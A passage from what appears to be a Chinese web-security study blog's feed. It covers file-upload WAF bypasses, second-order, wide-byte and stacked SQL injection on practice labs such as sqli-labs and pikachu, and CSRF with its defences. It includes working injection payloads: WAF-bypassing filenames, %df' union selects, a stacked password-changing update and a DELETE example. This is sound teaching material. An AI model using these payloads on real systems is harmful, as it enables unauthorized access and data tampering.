hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav  hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjs(直达WAF检测不出来) ; name=&quot;upload_file&quot;; filename=&quot;xxxx.php&quot;;content-type: image/jpeg</code></pre><p>方法二：重复Content-Disposition字段，将恶意文件放在最后（直到绕过WAF）</p><pre><code class="hljs">content-disposition:form-data; name=&quot;upload_file&quot;; filename=&quot;xxxx&quot;;content-disposition:form-data; name=&quot;upload_file&quot;; filename=&quot;xxxx&quot;;……content-disposition:form-data; name=&quot;upload_file&quot;; filename=&quot;x.php&quot;;content-type: image/jpeg</code></pre><p>方法三：在filename处进行溢出，将恶意文件放在最后（直到绕过WAF）</p><pre><code class="hljs">content-disposition:form-data; name=&quot;upload_file&quot;; filename=&quot;vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkccas e vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkc esavcsaxAC dvdsce vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkc ecsdv dvdsce vgdbcshjvebcvhascbwebckjbxc hewvcnx chjevwcj xn cec.xcne ccwe cewkc e dvdsc x.php&quot;;content-type: image/jpeg</code></pre><h2 id="3-文件上传漏洞防御"><a href="#3-文件上传漏洞防御" class="headerlink" title="3 文件上传漏洞防御"></a>3 文件上传漏洞防御</h2><p>1）代码层次：</p><p>前端检测（在前端用了JS 脚本做检测，如检测文件后缀名等）</p><p>服务器端检测：</p><p>①MIME类型检测（比如GIF图片MIME为image/gif，CSS文件的MIME为text/css）</p><p>②文件后缀名检测，如设置白名单，避免使用黑名单。</p><p>③文件内容检测</p><p>图片二次渲染。（最变态的文件上传漏洞防御方式）</p><p>检查文件上传路径。（避免被0x00截断、IIS6.0文件夹解析漏洞、目录遍历）</p><p>文件重命名，包括文件名及其扩展名（利用随机字符串或时间戳等方式进行命名，防止攻击者得到WebShell的路径）</p><p>将其存放路径和文件名存放在数据库中，系统使用文件时，通过查询数据库动态获取。</p><p>检验是否存在条件竞争的逻辑漏洞。</p><p>（2）管理层次：</p><p>部署WAF防火墙。</p><p>正确配置服务器请求类型。（禁止使用PUT请求方法）</p><p>及时更新系统、中间件、脚本、数据库、CMS或框架的漏洞补丁。（避免解析漏洞）</p><p>（3）设置权限</p><p>限制上传目录下拥有的执行权限</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>文件上传漏洞是指由于服务器配置不当或者没有进行足够的过滤，WEB用户可以上传任意文件，包括恶意脚本文件、EXE程序。常见的绕过方法分为前端和后端，前端禁用js，后端有黑白名单绕过，除此之外还有二次渲染绕过，条件竞争等形式。</p><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5 参考链接"></a>5 参考链接</h2><p><a href="https://blog.csdn.net/qq_53079406/article/details/125590572?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_53079406/article/details/125590572?spm=1001.2014.3001.5501</a><br><a href="https://www.freebuf.com/articles/web/163058.html">https://www.freebuf.com/articles/web/163058.html</a><br><a href="https://blog.csdn.net/weixin_44840696/article/details/90581104">https://blog.csdn.net/weixin_44840696/article/details/90581104</a><br><a href="https://blog.csdn.net/m0_64378913/article/details/124895215">https://blog.csdn.net/m0_64378913/article/details/124895215</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Sql注入】宽字节 二次注入</title>
    <link href="/2023/05/11/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/05/11/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>1 二次注入<br>2 二次注入案例 sqli-labs less-24<br>3 宽字节注入<br>4 宽字节注入案例 sqli-labs less-32<br>参考链接</p><h2 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1 二次注入"></a>1 二次注入</h2><p>二次注入是指已存储（数据库、文件）的用户输入被读取后，再次进入到 SQL 查询语句中导致的注入。<br>过程如下：</p><ol><li>第一次插入恶意数据：在第一次进行数据库插入数据的时候，使用addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号；<br>例如，插入1‘#；转义成1\’#。不能注入，但是保存在数据库时变成了原来的1’#。</li><li>引用恶意数据，篡改正常数据：再次调用时，拼凑到SQL中就形成了二次注入。<br>利用1’#进行注入，也很好理解，单引号提前闭合，#注释后续语句。<br>这里利用时要求取出数据时不转义。<br>二次注入比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。<br>换言之，二次注入需要具备的两个条件：<br>（1）用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）<br>（2）数据库对自己存储的数据非常放心，直接取出恶意数据给用户<h2 id="2-二次注入案例"><a href="#2-二次注入案例" class="headerlink" title="2 二次注入案例"></a>2 二次注入案例</h2><h3 id="2-1-以sqli-lab-less-24为例"><a href="#2-1-以sqli-lab-less-24为例" class="headerlink" title="2.1 以sqli-lab less-24为例"></a>2.1 以sqli-lab less-24为例</h3>正常来说，无法通过注入来登录admin，因为用户输入会被转义。<br>我们尝试注册admin ‘#，注册成功；<br>图片</li></ol><p>图片</p><p>登录admin’# 转义成admin&#39;#，则登录的是admin’#<br>更新密码的sql语句为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">pw</span>=’$newpw’ where username = ‘<span class="hljs-variable">$name</span>’ <span class="hljs-keyword">and</span> <span class="hljs-attribute">pw</span>=’oldpw’;<br></code></pre></td></tr></table></figure><p>修改admin’#的密码，由于这里不会被转义，故可以直接利用，这个时候就变成了修改了admin的密码，#后面的语句不执行<br>于是语句变成：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">pw</span>=’123456’ where username = ‘admin’#<span class="hljs-string">&#x27; and pw=’123’;</span><br></code></pre></td></tr></table></figure><p>于是我们修改admin密码成功</p><p>图片</p><p>注意到左图admin密码为admin，被修改为123456</p><h3 id="2-2-防御"><a href="#2-2-防御" class="headerlink" title="2.2 防御"></a>2.2 防御</h3><ol><li>通过预编译解决SQL注入。</li><li>永远不要相信用户的输入！对输入一视同仁，无论输入来自用户还是存储，在进入到 SQL 查询前都对其进行过滤、转义。<h2 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3 宽字节注入"></a>3 宽字节注入</h2>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），也就是说一次性会读取两个字节。</li></ol><p>简单来说，宽字节注入就是将两个ascii字符误认为是一个宽字节字符。</p><p>然而，除了GBK的存在，转义字符\也是可以构成此漏洞的因素。</p><p>当ascii码大于127的字符和转义字符\组成宽字节字符，会造成单引号或者双引号逃逸，进而导致sql注入。</p><p>产生宽字节注入的原因涉及了编码转换的问题，当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字，那么如果存在过滤我们输入的函数（addslashes()、mysql_real_escape_string()、mysql_escape_string()、Magic_quotes_gpc）会将我们的输入进行转义。</p><p>尝试注入，我们举一个简单的例子：</p><p>addslashes()：该函数的作用是返回在预定义字符之前添加反斜杠的字符串。</p><h2 id="4-宽字节注入案例"><a href="#4-宽字节注入案例" class="headerlink" title="4 宽字节注入案例"></a>4 宽字节注入案例</h2><h3 id="4-1-以sqli-lab-less-32为例"><a href="#4-1-以sqli-lab-less-32为例" class="headerlink" title="4.1 以sqli-lab less-32为例"></a>4.1 以sqli-lab less-32为例</h3><p>假设我们传入一个参数id为1’查看数据库是否错报：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/sqli-labs/Less-<span class="hljs-number">32</span>/?id=<span class="hljs-number">1</span>&#x27;<br></code></pre></td></tr></table></figure><p>那么经过函数过滤后我们的输入拼接到sql语句就会变成：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-string">&#x27;1\&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>图片</p><p>图片</p><p>单引号被转义了能正常执行。</p><p>图片</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/sqli-labs/Less-<span class="hljs-number">32</span>/?id=-<span class="hljs-number">1</span>%df%<span class="hljs-number">27</span>union select <span class="hljs-number">1</span>,user(),<span class="hljs-number">3</span>--+<br></code></pre></td></tr></table></figure><p>所以如上，%df’ 变为 %df&#39; 而 %df\组成 %df%5C ，此为運字。而運字刚好使得转义字符失效，单引号成功逃逸，造成提前闭合。<br>图片</p><h3 id="4-2-pikachu靶场wide-byte注入"><a href="#4-2-pikachu靶场wide-byte注入" class="headerlink" title="4.2 pikachu靶场wide byte注入"></a>4.2 pikachu靶场wide byte注入</h3><p>图片</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=kobe1%df&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h2><p>二次注入关键词为：已存储（数据库、文件）的用户输入被读取后，再次进入到 SQL 查询语句中导致的注入。</p><p>宽字节注入关键字为：当ascii码大于127的字符和转义字符\组成宽字节字符，从而造成单引号或者双引号逃逸，进而导致sql注入。</p><p>图片</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/kongzhian/article/details/110001836">https://blog.csdn.net/kongzhian/article/details/110001836</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://juejin.cn/post/7167647367246643208">https://juejin.cn/post/7167647367246643208</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Sql注入】堆叠注入</title>
    <link href="/2023/05/06/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/05/06/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>1 堆叠注入<br>2 堆叠注入案例<br>3 总结<br>4 参考链接</p><h2 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1 堆叠注入"></a>1 堆叠注入</h2><h3 id="1-1-堆叠注入成因"><a href="#1-1-堆叠注入成因" class="headerlink" title="1.1 堆叠注入成因"></a>1.1 堆叠注入成因</h3><p>Sql查询语句中， 分号“；”代表查询语句的结束，所以在执行sql语句结尾分号的后面，再加一条sql语句，这个语句会一起执行，造成注入，这就是堆叠注入（Stacked Injection）。<br>堆叠注入在mysql数据库中并不常见，常见于mssql数据库，mssql数据库是默认堆叠注入的。如用户输入：1; DELETE FROM products<br>服务器端生成的sql语句为：Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h3 id="1-2-堆叠注入触发条件"><a href="#1-2-堆叠注入触发条件" class="headerlink" title="1.2 堆叠注入触发条件"></a>1.2 堆叠注入触发条件</h3><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，这就需要服务器在访问数据端时，使用的是可同时执行多条sql语句的方法，例如php中的mysqli_multi_query函数。但与之相对应的mysqli_query()函数一次只能执行一条sql语句，所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数。总结就是：<br>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句<br>因此，堆叠注入存在局限性：堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。堆叠注入通常无错误回显，堆叠注入第二个语句产生错误或者结果只能被忽略。因此，在读取数据时，建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p><h2 id="2-堆叠注入案例"><a href="#2-堆叠注入案例" class="headerlink" title="2 堆叠注入案例"></a>2 堆叠注入案例</h2><h3 id="2-1-强网杯19年随便注-BUUCTF靶场可测"><a href="#2-1-强网杯19年随便注-BUUCTF靶场可测" class="headerlink" title="2.1 强网杯19年随便注 - BUUCTF靶场可测"></a>2.1 强网杯19年随便注 - BUUCTF靶场可测</h3><p>还记得我们先前总结的测试流程吗？<br>首先，上万能payload， 单引号。<br>输入1’ 页面报错了，加上注释符号#页面又回显正常，那么闭合符号就是单引号。<br><img src="/img/stacked_1.png"><br>过滤了很多函数和关键字。<br>尝试堆叠注入：1’; show databases;#</p><p><img src="/img/stacked_2.png"></p><p>发现成功，爆出了有用的信息。</p><p>后续解题思路参考后文链接。我们浅尝则止，旨在突出堆叠注入的特点和使用场景。</p><h3 id="2-2-Sqli-lab-Less-38-堆叠注入-字符型-GET"><a href="#2-2-Sqli-lab-Less-38-堆叠注入-字符型-GET" class="headerlink" title="2.2 Sqli-lab Less-38 堆叠注入 - 字符型 - GET"></a>2.2 Sqli-lab Less-38 堆叠注入 - 字符型 - GET</h3><p>传入单引号报错,发现错误回显分析后构造单引号闭合发现字符型注入</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?i</span>d=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-string">?i</span>d=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段。</p><p>于是尝试堆叠注入将id为1的用户密码改成123,可以配合联合查询来判断sql是否执行。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">38</span>/?id=-<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br><br><span class="hljs-attribute">update</span>%<span class="hljs-number">20</span>users%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>password=<span class="hljs-number">123</span>%<span class="hljs-number">20</span>where%<span class="hljs-number">20</span>id=<span class="hljs-number">1</span>--+<br></code></pre></td></tr></table></figure><p>再次查询时发现已经更改，我们打开php源代码看一下是什么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br>&#123;<br>    <span class="hljs-comment">/* store first result set */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> = mysqli_store_result(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;  <br>            printf(<span class="hljs-string">&quot;Your Username is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            printf(<span class="hljs-string">&quot;Your Password is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-comment">//         mysqli_free_result    ($result);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到有这个函数：mysqli_multi_query。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>堆叠注入其实很好理解，但是它的应用场景比较局限，我们只需要知道注意多个sql语句同时执行这种情况可能存在注入就行。后面我们讲解宽字节注入和二次注入。</p><p>目前正在学习pikachu靶场，整理Burpsuite的使用笔记等等。</p><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4 参考链接"></a>4 参考链接</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/qq_39654116/article/details/105421499">https://blog.csdn.net/qq_39654116/article/details/105421499</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://blog.csdn.net/qq_45927819/article/details/123594626">https://blog.csdn.net/qq_45927819/article/details/123594626</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.yii666.com/article/522417.html">https://www.yii666.com/article/522417.html</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://blog.csdn.net/nobugnomoney/article/details/124863497">https://blog.csdn.net/nobugnomoney/article/details/124863497</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Web安全基础】CSRF</title>
    <link href="/2023/05/05/CSRF/"/>
    <url>/2023/05/05/CSRF/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h2 id="1-CSRF原理"><a href="#1-CSRF原理" class="headerlink" title="1 CSRF原理"></a>1 CSRF原理</h2><p>CSRF, Cross-site request forgery，即“跨站请求伪造”，是指攻击者可能利用网页中的恶意<br>代码强迫受害者浏览器向被攻击的Web站点发送伪造的请求，篡夺受害者的认证Cookie等身份<br>信息，从而假冒受害者对目标站点执行指定的操作。<br>简单来讲，CSRF 攻击就是黑客冒用用户身份并通过第三方的站点执行非法操作。这种攻击我们也称为“One Click Attack”或者Session Riding。</p><h3 id="1-1-什么是cookie？"><a href="#1-1-什么是cookie？" class="headerlink" title="1.1 什么是cookie？"></a>1.1 什么是cookie？</h3><p>在 Web认证中 ,因为HTTP协议本身的局限，必须采用其他技术将相关认证标记以某种方式持续传送，以免客户从一个页面跳转至另一个页面时重新输入认证信息。<br>Cookie由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。<br>图片</p><p>csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）。这个操作不是用户真正想要执行的。<br><a href="https://www.freebuf.com/articles/web/206407.html">https://www.freebuf.com/articles/web/206407.html</a><br>1.2 攻击流程</p><p>一个典型的CSRF攻击有着如下的流程：</p><p>受害者登录 a.com，并保留了登录凭证（Cookie）。</p><p>攻击者引诱受害者访问 b.com。</p><ul><li>b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带 a.com 的 Cookie。</li><li>a.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li><li>a.com 以受害者的名义执行了 act=xx。</li><li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。</li></ul><p>图片</p><p>典型的CSRF攻击</p><p>一个CSRF漏洞攻击的实现，其需要由三个部分来构成</p><ul><li>有一个漏洞存在（无需验证、任意修改后台数据、新增请求）；</li><li>伪装数据操作请求的恶意链接或者页面；</li><li>诱使用户主动访问或登录恶意链接，触发非法操作</li></ul><h2 id="2-CSRF防御"><a href="#2-CSRF防御" class="headerlink" title="2 CSRF防御"></a>2 CSRF防御</h2><p>CSRF的防御可以从两个方面考虑，一是后台接口层做防御，另一个则是在前端做防御。</p><h3 id="2-1-后端防御CSRF"><a href="#2-1-后端防御CSRF" class="headerlink" title="2.1 后端防御CSRF"></a>2.1 后端防御CSRF</h3><p>后端防御主要是区分哪些请求是恶意请求，哪些请求是来自本网站的请求。区分恶意请求的方式有很多，以下介绍两种。</p><p>一、CSRF Token</p><p>这种方式是在表单页面生成一个随机数，这个随机数一定要后端生成，并且对这个随机数进行存储。举个例子，在前端页面中，对这个Token表单项进行隐藏。代码如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;form <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/transfer&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;_csrf&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;4bfd1575-3ad1-4d21-96c7-4ef2d9f86721&quot;</span>/&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;amount&quot;</span>/&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;account&quot;</span>/&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;Transfer&quot;</span>/&gt;&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>_csrf就是CSRF Token。我们看到他的value是一个UUID，这个UUID是后台生成的。当用户点击转账按钮时，会给银行的后台发送请求，请求中包含_csrf参数，如下：</p><p>POST /transfer HTTP/1.1Host: <a href="http://www.a-bank.comcookie/">www.a-bank.comCookie</a>: JSESSIONID=randomidContent-Type: application/x-www-form-urlencoded<br>amount=100.00&amp;account=9876&amp;_csrf=4bfd1575-3ad1-4d21-96c7-4ef2d9f86721</p><p>银行后台接收到这个请求后，判断_csrf的值是否存在，如果存在则是自己网站的请求，进行后续的流程；如果不存在，则是恶意网站的请求，直接忽略。</p><p>二、通过请求头中的referer字段判断请求的来源</p><p>每一个发送给后端的请求，在http请求头中都会包含一个referer字段，这个字段标识着请求的来源。如果请求是从银行网站发出的，这个字段会是银行网站转账页的链接，比如：<a href="https://www.a-bank.com/transfer-view%EF%BC%9B%E5%A6%82%E6%9E%9C%E6%98%AF%E4%BB%8E%E6%81%B6%E6%84%8F%E7%BD%91%E7%AB%99%E5%8F%91%E5%87%BA%E7%9A%84%EF%BC%8C%E9%82%A3%E4%B9%88referer%E5%AD%97%E6%AE%B5%E4%B8%8D%E4%BC%9A%E6%98%AF%E9%93%B6%E8%A1%8C%E7%BD%91%E7%AB%99%E3%80%82%E6%88%91%E4%BB%AC%E5%9C%A8%E5%81%9A%E5%90%8E%E7%AB%AF%E9%98%B2%E5%BE%A1%E6%97%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%85%88%E5%8F%96%E5%87%BA%E6%AF%8F%E4%B8%AA%E8%AF%B7%E6%B1%82%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%B8%AD%E7%9A%84referer%E5%AD%97%E6%AE%B5%EF%BC%8C%E5%88%A4%E6%96%AD%E6%98%AF%E4%B8%8D%E6%98%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E7%BD%91%E7%AB%99%E7%9A%84%E5%9F%9F%E5%90%8D%E5%BC%80%E5%A4%B4%EF%BC%8C%E5%9C%A8%E5%92%B1%E4%BB%AC%E7%9A%84%E7%A4%BA%E4%BE%8B%E4%B8%AD%EF%BC%8C%E5%A6%82%E6%9E%9Creferer%E5%AD%97%E6%AE%B5%E6%98%AF%E4%BB%A5https://www.a-bank.com/%E5%BC%80%E5%A4%B4%E7%9A%84%EF%BC%8C%E5%88%99%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E8%BD%AC%E8%B4%A6%E6%93%8D%E4%BD%9C%EF%BC%9B%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%98%AF%EF%BC%8C%E5%88%99%E7%9B%B4%E6%8E%A5%E5%BF%BD%E7%95%A5%E6%8E%89%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E3%80%82">https://www.a-bank.com/transfer-view；如果是从恶意网站发出的，那么referer字段不会是银行网站。我们在做后端防御时，可以先取出每个请求的请求头中的referer字段，判断是不是以自己网站的域名开头，在咱们的示例中，如果referer字段是以https://www.a-bank.com/开头的，则继续执行转账操作；如果不是，则直接忽略掉这个请求。</a></p><p>以上就是后端防御CSRF攻击的两种方式，都需要在后端做特殊的处理。当然也可以在前端做处理，我们接着往下看。</p><h3 id="2-2-前端防御CSRF"><a href="#2-2-前端防御CSRF" class="headerlink" title="2.2 前端防御CSRF"></a>2.2 前端防御CSRF</h3><p>既然CSRF攻击的危害这么大，为什么不能在前端禁止这种请求呢？各大浏览器厂商似乎也注意到了这个问题，谷歌提出了same-site cookies概念，same-site cookies 是基于 Chrome 和 Mozilla 开发者花了三年多时间制定的 IETF 标准。它是在原有的Cookie中，新添加了一个SameSite属性，它标识着在非同源的请求中，是否可以带上Cookie，它可以设置为3个值，分别为：1) Strict 2) Lax 3) None</p><p>Cookie中的内容为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST /transfer HTTP/1.1Host: www.a-bank.com<br>Cookie: <span class="hljs-attribute">JSESSIONID</span>=randomid; <span 